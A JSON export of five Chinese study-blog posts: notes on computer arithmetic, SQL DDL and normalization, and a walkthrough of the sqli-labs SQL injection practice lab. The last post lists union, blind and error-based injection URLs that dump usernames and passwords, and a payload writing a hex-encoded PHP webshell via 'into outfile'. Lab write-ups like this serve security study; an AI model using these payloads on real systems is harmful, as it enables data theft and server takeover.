[{"id":"460b9e3a35727b706e187bd7c49b4015","title":"计算机组成原理-数据的表示和运算-2","content":"# 移位运算\n\n# 算数移位\n\n\n移动小数点相当于改变每个位的位权\n移位：通过改变各个数码位和小数点的相对位置，从而改变各个数码位的位权。可以用移位运算实现乘法、除法\n\n# 原码的算数移位\n原码的算数移位：符号位保持不变，仅对数值位进行移位\n右移：高位补 0，低位舍弃，若舍弃的位等于 0，则相当于除以 2，若舍弃的位不等于 0，则会丢失精度\n\n左移：低位补 0，高位舍弃，若舍弃的位等于 0，则相当于 ×2，若舍弃的位不等于 0，则会出现严重误差\n\n原码表示的定点小数与定点整数一个效果\n# 反码的算数移位\n正数的反码移位：正数的反码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样\n负数的反码移位\n\n反码尾数部分和原码是完全相反的，\n右移：高位补 1，低位舍弃\n左移：低位补 1，高位舍弃\n\n# 补码的算数移位\n正数的补码移位：正数的补码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样\n负数的补码移位\n\n补码是从反码的基础上末位 + 1 得到的\n补码的规律为：从右往左到第一个 1 为止，后半部分与原码相同，前半部分和反码相同\n\n\n\n右移：高位补 1，低位舍弃\n左移：低位补 0，高位舍弃\n\n# 算数移位总结\n\n# 算数移位的应用举例\n\n\n# 循环移位\n在循环移位的时候整个二进制字符串是进行循环补位的\n\n循环左移\n带进位位的循环左移\n\n\n\n循环移位的操作很适合把一个数字的低字节和高字节进行调换\n# 知识点回顾\n\n# 定点数原码乘法运算\n\n手算乘法（十进制）\n\n手算乘法（二进制）\n\n考虑用及其实现：\n\n实际数字有正负，符号位如何处理？\n乘积的位数扩大一倍，如何处理？\n4 个位积都要保存下来最后统一相加？\n\n# 原码一位乘法\n符号位单独处理：符号位等于 x 的符号位异或 y 的符号位\n数值位取绝对值进行乘法计算\n\n\nMQ 存放乘数和积的低位\nX 里存放被乘数\nACC 存放乘积高位\n如果 MQ 的最低位为 1，ACC 就加上 X 中的值，如果 MQ 的最低位为 0，就不进行相加\n相加结束之后 ACC 和 MQ 整体右移一位，循环上述操作\n乘数的符号位不用参与运算\n小数点隐含在积的符号位的右边\n\n\n# 原码一位乘法（手算模拟）\n\n原码整数的乘法与小数的运算方法是一致的，注意一下小数点的位置即可\n# 定点数补码的乘法运算\n# 补码的一位乘法\n设机器字长为 5 位（含符号位，n=4），x=-0.1101, y=+0.1011，采用 Booth 算法求 x・y\n原码一位乘法\n\n进行 n 轮加法、移位\n每轮可能加 x 绝对值，可能加 0，具体要看 MQ 的最低位的值\n每次移位是 “逻辑右移”\n符号位不参与运算\n\n补码一位乘法\n\n进行 n 论加法、移位，最后再多来一次加法\n可能加 0，可能加 [x] 补，可能加 [-x] 补，根据当前 MQ 的最低位和辅助位来确定加什么\n\n辅助位 - MQ 中最低位 = 1 时，(ACC)+[X] 补\n辅助位 - MQ 中最低位 = 0 时，(ACC)+0\n辅助位 - MQ 中最低位 =-1 时，(ACC)+[-X] 补\n\n\n每次移位是 “补码的算数右移”—— 算数右移：符号位保持不动，数字右移\n符号位参与运算\n\n补码的一位乘法（手算模拟）\nMQ 需要多一位做辅助位，辅助位初始为 0，每次右移会使 MQ 的最低位顶替原本的辅助位，随之 ACC 和 X 都是双符号位\n\n# 定点数原码除法运算\n\n# 手算除法（十进制）\n\n手算除法（二进制）\n\n# 原码除法：恢复余数法\n符号位单独处理：被除数和除数的符号位异或\n数值拉取绝对值进行除法计算\n写出 x,y 的原码，y 的补码，[-y] 补\n\n\n每次上商的时候默认会商 1，然后会把 ACC 和通用寄存器的值相减后的结果再放回 ACC 中（(ACC)+[-y] 补），如果减法运算之后符号位为 1，说明此时余数小于除数，应该商 0 的，之后计算机再将上商的值改为 0，这时 ACC 的值已经放了之前的负数，要在返回原样，就要再加上除数 [y] 补，再次覆盖 ACC\n\n\n把 ACC 和 MQ 的内容全部左移一位，进行一个错位，重复上述步骤\n\n\n\n小数点默认在第一个 0 后面，余数 = 0.0111X2^{-n}，n=4\n# 原码除法：恢复余数法（手算）\n\n# 原码除法：加减交替法（不恢复余数法）\n\n\n思路：上商为 1 相减之后出现负数直接上商 0，然后逻辑左移，加 y 补\n# 定点数补码除法运算\n# 补码除法：加减交替法\n\n符号位直接参与运算，因此不用写绝对值的补码，直接写原数的补码\n采用双符号位\n被除数和除数同号，则被除数减去除数；异号则被除数加上除数\n余数和除数同号，商 1，余数左移一位减去除数\n余数和除数异号，商 0，余数左移一位加上除数\n重复 n 次\n\n\n末位商恒置为 1\n# 除法运算总结回顾\n\n","slug":"计算机组成原理-数据的表示和运算-2","date":"2022-06-12T00:58:10.000Z","categories_index":"计算机组成原理","tags_index":"计算机组成原理,408","author_index":"cCor4ng3"},{"id":"02e7efbd219a0c25e416f110675eb1a9","title":"计算机组成原理-数据的表示和运算","content":"# 无符号整数的表示和运算\n# 无符号整数的加法\n按位相加\n# 无符号整数的减法\n\n被减数不变，减数全部按位取反，末位 + 1，减法变加法\n从最低位开始，按位相加，并往更高位进位\n\n# 带符号整数的表示和运算 - 原反补\n# 补码的加法运算\n当负数参与加法运算时，要将两个数全部取补码，符号位也参与运算，不需要单独处理\n# 补码的减法运算\n[A]补−[B]补=[A]补+[−B]补[A]_补-[B]_补=[A]_补+[-B]_补[A]补​−[B]补​=[A]补​+[−B]补​\n[B]补[B]_补[B]补​转[−B]补[-B]_补[−B]补​：全部位按位取反（包括符号位），末位加 1\n\n或者：找第一个 1，左边全部取反，右边不变\n例 1：19-19\n\nC 语言中 int 等带符号整数是用补码来表示的\n# 原 / 反 / 补码特性对比\n小题常见考点\n\n\n原码和反码的合法表示范围完全相同，都有两种方法表示真值 0；\n补码的合法表示范围比原码多一个负数，只有一种方式表示真值 0：\n\n如果有 8 个比特，原码和反码能够表示 - 127~127，补码可以表示 - 128~127\n补码中 - 128 的表示为：1,0000000；\n原码能表示的最小的值 - 127：1,1111111；\n-128 不能转为 - 127\n补码的真值 0 表示方法：0,0000000\n\n常见考点：A 和 B 进行某种运算后，是否发生溢出 —— 手算做题可以带入十进制验证是否超出合法范围\n# 移码表示\n\n移码：在补码的基础上符号位取反就是移码，移码只能用来表示整数\n移码的合法表示范围和补码相同，也只能有一种表示真值 0 的形式，[0] 移 = 10000000\n\n\n# 定点小数的表示和运算\n定点：小数点的符号固定\n\n# 定点小数反码、补码的转换\n\n# 定点小数的加 / 减运算\n\n# 定点小数与定点整数的区别\n\n定点小数在位数扩展时，拓展位置不一样，要加在右边\n定点小数带符号与不带符号的加法减法与定点整数一样\n# 奇偶校验码\n\n\n# 算术逻辑单元 ALU\n\n\n算术运算：加减乘除等\n逻辑运算：与或非异或等\n辅助功能：移位、求补等\n\n\n# 最基本的逻辑运算\n\n在一个复杂的逻辑表达式中，与运算的优先级大于或运算的优先级 —— 类比乘法和加法，先算与再算减，且与或运算也符合下面规律\n\nA (C+D) = AC + AD —— 分配率\nABC = A (BC) —— 结合律\nA + B + C = A + (B + C) —— 结合律\n\n\n本质上逻辑表达式是对电路的数学描述，简化逻辑表达式就是在简化电路设计\n# 复合逻辑\n\n与非就是先与再非，或非就是先或再非\n反演律：\n\nA 或 B 的非等于 A 的非与 B 的非\nA 与 B 的非等于 A 的非或 B 的非\n\n同或 ： 异或取反\n\n# 用门电路求偶校验位\n\n# 一位全加器\n\n# 串行加法器\n\n# 串行进位的并行加法器\n\n串行进位又称为行波进位，每一级进位直接依赖于前一级的进位，级进位信号是逐级形成的\n\n# 并行进位加法器\n以上的串行进位的并行加法器，下一位的结果都依赖于上一位 C 的输出，只有上一位的运算结果出来以后下一位才能进行运算，运算速度还是受进位信息产生速度的影响。\n每个进位产生的逻辑表达式:Ci=AiBi+(Ai⨁Bi)Ci−1C_i = A_iB_i + (A_i \\bigoplus B_i )C_{i-1}Ci​=Ai​Bi​+(Ai​⨁Bi​)Ci−1​，依赖于两个本位的数值和来自低位的进位，Ci-1 可以继续进行展开\n\n\n这种加法器的设计每个位的进位几乎是同时产生的\n不足：位数越多电路表达式会越复杂，一般最高到 4 位加 4 位的运算\n# 补码加减运算器\n加法器原理\n\n补码加 / 减法运算\n\nn bit 补码 X+Y，按位相加即可\nn bit 补码 X-Y：将补码 Y 全部按位取反，末位 + 1，得到 [-Y] 补，减法变加法\n\n\n无符号整数的加 / 减法也可以用该电路实现\n\n无符号数 X+Y，按位相加即可\n无符号整数 X-Y，将 Y 全部按位取反，末位 + 1，减法变加法\n\n补码加减运算和无符数的加减运算都可以用同一个运算器实现，但是溢出位的判断不同\n所以底层的硬件都是同一套逻辑，不管给的数是有符号还是无符号，因此溢出判断要进行处理\n# 标志位的生成\n\n加法器输出四个标志位的信息\n\nOF：溢出标志，只在有符号数的加减运算时有效（无符号运算时即使 OF=1，也不能说明发生了溢出）\n\nOF 的硬件逻辑：OF = 最高位的进位异或次高位的进位\n在有符号整数的运算中，如果发生了溢出，可以判断这个运算结果是错误的\n\nSF：符号标志，运算结果为正则置为 0，结果为负则置为 1\n\nSF 的硬件计算方法：SF = 最高位的本位和\nSF 位对无符号数的加减法无意义\n\nZF：零标志，运算结果为 0 时 ZF 置为 1，否则为 0\n\n对有符号数和无符号数都有意义\n\nCF：进位 / 错位标志，进位 / 错位时置 1，否则置 0\n\nCF 表示无符号数的加减法是否发生了进位或错位，只对无符号数有意义，对有符号数无意义\n\n\n\n产生借位意思为被减数不够减，要向上一位借一位，所以发生 CF 时结果是错误的，就是产生了溢出\n\n有符号整数加减运算是否产生了溢出要看 OF 位，无符号整数加减运算是否产生溢出要看 CF 位\n","slug":"计算机组成原理-数据的表示和运算","date":"2022-06-11T03:21:41.000Z","categories_index":"计算机组成原理","tags_index":"计算机组成原理,408","author_index":"cCor4ng3"},{"id":"6b01e0a1bee5e460cbe53bebb203270e","title":"数据库-关系数据库标准语言SQL","content":"# 3.3 数据定义\n# 3.3.1 模式的定义与删除\n# 1. 定义模式\ncreate schema &lt;模式名> authorization &lt;用户名>\n例 3.1：为用户 WANG 定义一个学生 - 课程模式 S-T\ncreate schema \"S-T\" authorization WANG;\n# 2. 删除模式\ndrop schema &lt;模式名> &lt;cascade|restrict>\n# 3.3.2 基本表的定义、删除与修改\n# 1. 定义基本表\n例 3.5：建立一个学生表 Student\ncreate table student(\n    sco char(9) primary key,\n    sname char(20) unique,\n    ssex char(2),\n    sage smallint,\n    sdept char(20)\n);\n# 2. 数据类型\n# 3. 模式与表\n# 4. 修改基本表\n例 3.8：向 Student 表增加” 入学时间 “列，其数据类型为日期型\nalter table Student add S_entrance DATE;\n例 3.9：将年龄的数据类型由字符型（假设原来的数据类型是字符型）改为整数\nalter table Student alter column Sage INT;\n例 3.10：增加课程名称必须取唯一值的约束条件\nalter table Student add unique(Cname);\n# 5. 删除基本表\n例 3.11：删除 Student 表\ndrop table Student cascade;\n# 3.3.3 索引的建立与删除\n# 1. 建立索引\n在 SQL 语言中，建立索引使用 CREATE INDEX 语句，其一般格式为：\nCREATE [UNIQUE][CLUSTER] INDEX 索引名 ON &lt;表名&gt;(&lt;列名&gt;[&lt;次序&gt;])\n例 3.13：为学生 - 课程数据库中的 Student、Course 和 SC 三个表建立索引。其中 Student 表按学号升序建唯一索引，Course 表按课程号升序建唯一索引，SC 表按学号升序和课程号降序建唯一索引。\ncreate unique index stusno on student(Sno);\nCREATE UNIQUE INDEX Coucno ON Course(Cno);\nCREATE UNIQUE INDEX SCno ON SC(Sno ASC, Cno DESC);\n# 2. 修改索引\n例 3.14：将 SC 表的 SCno 索引名改为 SCSno\nALTER INDEX SCno RENAME TO SCSno;\n# 3. 删除索引\nDROP INDEX Stusname;\n# 3.4 数据查询\n","slug":"数据库-关系数据库标准语言SQL","date":"2022-06-09T11:13:01.000Z","categories_index":"数据库","tags_index":"数据库","author_index":"cCor4ng3"},{"id":"7c1208209b9fd71ae4c371be24b134d7","title":"数据库-关系数据理论","content":"# 6.1 问题的提出\nR(U,D,DOM,F)：\n\n关系明 R 是符号化的元组语义\nU 为一组属性\nD 为属性组 U 中的属性所来自的域\nDOM 为属性到域的映射\nF 为属性组 U 上的一组数据依赖\n\n第一范式：每一个分量必须是不可分割的数据项\n数据依赖是一个关系内部属性与属性之间的一种约束关系，是通过属性间值的相等与否体现出来的数据间相关联系。其中最重要的是函数依赖和多值依赖。\n函数依赖：比如描述一个学生的关系，可以有学号 (sno)，姓名 (sname)，系名 (sdept) 等几个属性。由于一个学号只对应一个学生，一个学生只在一个系学习。因而当” 学号 “的值确定之后，学生的姓名及所在的系值也就被唯一地确定了。类似的有Sname=f(sno)Sname = f(sno)Sname=f(sno)，Sdept=f(Sno)Sdept = f(Sno)Sdept=f(Sno)，即 sno 函数决定 sname，或者说 sname 函数依赖于 sno。记作Sno→SnameSno \\rightarrow SnameSno→Sname。\n一个学生例子：F=\\\n但是这个关系存在以下的问题：\n\n数据冗余\n\n如一个系的系主任名重复出现\n\n\n更新异常\n插入异常\n删除异常\n\n将这个单一的模式改造如下，分成三个关系模式：\n\nS(Sno,Sdept,Sno→Sdept)S(Sno,Sdept,Sno \\rightarrow Sdept )S(Sno,Sdept,Sno→Sdept)\nSC(Sno,Cno,Grade,(Sno,Cno)→Grade)SC(Sno,Cno,Grade,(Sno,Cno) \\rightarrow Grade)SC(Sno,Cno,Grade,(Sno,Cno)→Grade)\nDEPT(Sdept,Mname,Sdept→Mname)DEPT(Sdept,Mname,Sdept \\rightarrow Mname)DEPT(Sdept,Mname,Sdept→Mname)\n\n# 6.2 规范化\n通常按属性间依赖情况来区分关系规范化程度为第一范式、第二范式、第三范式和第四范式，然后，直观地描述如何将具有不合适性质的关系转换为更合适的形式。\n# 6.2.1 函数依赖\n定义 6.1：设 R (U) 是属性集 U 上的关系模式，X, Y 是 U 的子集。若对于 R (U) 的任意一个可能的关系 r，r 中不可能存在两个元组在 X 上的属性值相等，而在 Y 上的属性值不等，则称 X 函数确定 Y 或 Y 函数依赖于 X，记作X→YX \\rightarrow YX→Y。\n函数依赖和别的数据依赖一样是语义范畴的概念，只能根据语义来确定一个函数依赖。例如，姓名→\\rightarrow→ 年龄这个函数依赖只有在该部门没有同名人的条件下成立。\n下面介绍一些术语和记号：\n\nX→YX \\rightarrow YX→Y，但 Y 不属于 X，则称X→YX \\rightarrow YX→Y 是非平凡的函数依赖。\nX→YX \\rightarrow YX→Y，但 Y 属于 X，则称X→YX \\rightarrow YX→Y 是平凡的函数依赖。对于任一关系模式，平凡函数依赖都是必然成立的，他不反映新的语义。若不特别声明，总是讨论非平凡的函数依赖。\n若X→YX \\rightarrow YX→Y，则称 X 为这个函数依赖的决定属性组，也称为决定因素。\n若X→YX \\rightarrow YX→Y，Y→XY \\rightarrow XY→X，则记作X←→YX \\leftarrow \\rightarrow YX←→Y。\n若 Y 不函数依赖于 X，则记作X→YX \\rightarrow YX→Y，箭头加斜线\n\n定义 6.2：在 R (U) 中，如果X→YX \\rightarrow YX→Y，并且对于 X 的任何一个真子集X′X&#x27;X′，都有X′X&#x27;X′ 不函数依赖于YYY，则称 Y 对 X 完全函数依赖，记作 —&gt;F\n定义 6.3：传递函数依赖\n# 6.2.2 码\n码是关系模式中的一个重要概念。\n定义 6.4：设 K 为 R&lt;U,F&gt; 中的属性或属性集合，若 U 完全依赖于 K，则 K 为 R 的候选码。\n注意 U 是完全依赖于 K，而不是部分依赖于 K。一般地，如果 U 函数依赖于 K，即K→UK \\rightarrow UK→U，则 K 称为超码。候选码是一类特殊的超码，即候选码的超集（如果存在）一定是超码，候选码的任何真子集一定不是超码。\n若候选码多于一个，则选定其中的一个为主码。\n包含在任何一个候选码中的属性称为主属性；不包含在任何候选码中的属性称为非主属性或非码属性。最简单的情况，单个属性是码；最极端的情况，整个属性组是码，称为全码。\n定义 6.5：关系模式 R 中属性或属性组 X 并非 R 的码，但 X 是另一个关系模式的码，则称 X 是 R 的外部码，也称外码。\n# 6.2.3 范式\n关系数据库中的关系是要满足一定的要求的，满足不同程度要求的为不同范式。\n一个低一级范式的关系模式通过模式分解可以转换为若干个高一级范式的关系模式的集合，这种过程就叫规范化。\n# 6.2.4 2NF\n定义 6.6：若R∈1NFR\\in 1NFR∈1NF，且每一个非主属性完全函数依赖于任何一个候选码，则R∈2NFR\\in 2NFR∈2NF。\n# 6.3 数据依赖的公理系统\n定义 6.11：对于满足一组函数依赖 F 的关系模式 R&lt;U,F&gt;，其任何一个关系 r，若函数依赖X→YX \\rightarrow YX→Y 都成立（即 r 中任意两元祖 t、s，若 t [X]=s [X]，则 t [X]=s [Y]），则称 F 逻辑蕴含X→YX \\rightarrow YX→Y.\n公理系统设 U 为属性集总体，F 是 U 上的一组函数依赖，于是有关系模式 R&lt;U,F&gt;，对 R&lt;U,F &gt; 来说有以下的推理规则：\n\nA1 自反律\nA2 增广率\nA3 传递率\n\n定义 6.13：设 F 为属性集 U 上的一组函数依赖，X、Y⊆\\subseteq⊆U，XF+={A∣X→A能由F根据Armstrong公理导出}X^+_{F}=\\{A|X \\rightarrow A 能由F根据Armstrong 公理导出\\}XF+​={A∣X→A能由F根据Armstrong公理导出}，XF+X^+_FXF+​ 称为属性集 X 关于函数依赖集 F 的闭包。\n","slug":"数据库-关系数据理论","date":"2022-06-08T13:12:23.000Z","categories_index":"数据库","tags_index":"数据库","author_index":"cCor4ng3"},{"id":"1b32940dd409c0fe09232e5ee728ee0b","title":"sqli-labs笔记","content":"测试上线使用\n注意点：PHP 要使用低版本，高版本无法安装\thttps://github.com/Audi-1/sqli-labs\n# 相关知识点\n\n\n\n\n\n\n\n\n\n信息收集知识点：\n数据库版本：version ()\t 5.7.22-0ubuntu0.16.04.1\n数据库用户：user ()\t\t root@localhost\n数据库名字：database ()\t mozhe_Discuz_StormGroup\n操作系统：@@version_compile_os\t Linux\n版本问题：5.1 以上是高版本，5 以下是低版本  （高版本和低版本的区别在于高版本有 information_schema，低版本没有）\n\n\n\n\n\n\n\n\n\n读写文件操作 (mysql 特有功能)\nload_file (): 文件读取函数\ninto outfile 或 into dumpfile：导出函数\n使用条件：secure_file_priv 为空（为空不是为 null），开启方法：在配置文件中添加\n# less 01\n\n经过测试，闭合符号为单引号，注释使用 &quot;–+&quot;\n\n\n\n但是不知道为什么在通过 order 判断字段数的时候 #注释会有问题，用–+ 注释没有问题\n\n\n\n判断出字段共有三列，判断回显位置\n\n\n\n查询数据库和当前用户名\n\n\n\n以下为 payload，依次使用即可\n\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema = \"security\"--+ #爆破表名\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),database() from information_schema.columns where table_name = \"users\" and table_schema = \"security\"--+ #爆破列名\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users--+ #爆破数据\n\n# less 02\n\nless 02 经测试为无引号包裹\n\n\n\n测试字段数\n\n\n\n信息收集\n\n\n\npayload\n\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=\"security\"#  #获取表名\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(column_name),user() from information_schema.columns where table_name=\"users\" and table_schema=\"security\"# #获取字段\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users# #获取数据\n\n# less 03\n\n判断闭合方式为双引号\n\n\n\n确定字段数时出现问题，发现后面有一个括号\n\n\n\n经过尝试发现 id 的闭合方法应该为’)，注意注释方法要多试几次，不知道抽什么疯，payload:   ?id=1') order by 4-+\n\n\n\n判断回显位置\n\n\n\npayload：\n\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,database(),user()--+ #信息收集\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(table_name),user() from information_schema.tables where table_schema = \"security\"--+ #查表\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(column_name),user() from information_schema.columns where table_name = \"users\" and table_schema = \"security\"--+ #获取字段名\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users--+ #数据\n\n# less 04\n\n测试注入点，发现这里还是有一个括号干扰\n\n\n\n最终发现注入点的 payload 为： http://127.0.0.1/sqli-labs/Less-4/?id=1&quot;) and 1=1--+\n\n\n\n判断字段数\n\n\n\n判断回显位置\n\n\n\npayload：\n\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,database(),user()--+ #信息收集\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=\"security\"--+ #获取表名\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(column_name),user() from information_schema.columns where table_name=\"users\" and table_schema=\"security\"--+ #获取列名\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(username),group_concat(password) from users--+ #获取数据\n\n# less 05\n# 1、布尔盲注 —— 使用 left 进行尝试\n\n利用 left 函数判断数据库版本。下面语句是判断版本的第一个字符是否是 5，发现正常返回结果，如果结果不正常是不能返回 you are in 的\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),1)=5--+\n\n\n使用 length 函数判断数据库名称的长度，发现到 8 时正常返回，说明数据库名称的长度为 8\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+\n\n\n使用 left 函数猜测数据库第一位，当试到 s 时正确显示，说明数据库名称的第一位是 s，继续测试出第二位是 e\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),1)=\"s\"--+\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)=\"se\"--+\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)>\"se\"--+ #使用ascii的值对字符进行判断\n\n# 2、报错注入\n\npayload 如下，使用 updatexml 函数\n\n#获取当前数据库名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+\n#获取当前数据库所有表名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+\n#获取当前数据库user表所有列名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1)--+\n#获取当前数据库user表所有username和password的值\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),32,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),63,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),94,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),125,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),156,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),187,31),0x7e),1)--+\n#下面这步写webshell\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1' into outfile 'C:/less5.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e--+\n \n\n本关为无回显注入\n\n\n\n判断闭合方式为单引号\n\n\n\n获取数据库\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select database()))))--+\n\n\n获取表名\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+\n\n\n获取字段名\n\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database()))))--+\n\n\n获取数据\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+\n#1依次加31即可\n\n","slug":"sqli-labs笔记","date":"2022-06-07T06:44:48.000Z","categories_index":"web安全","tags_index":"web安全,测试","author_index":"cCor4ng3"}]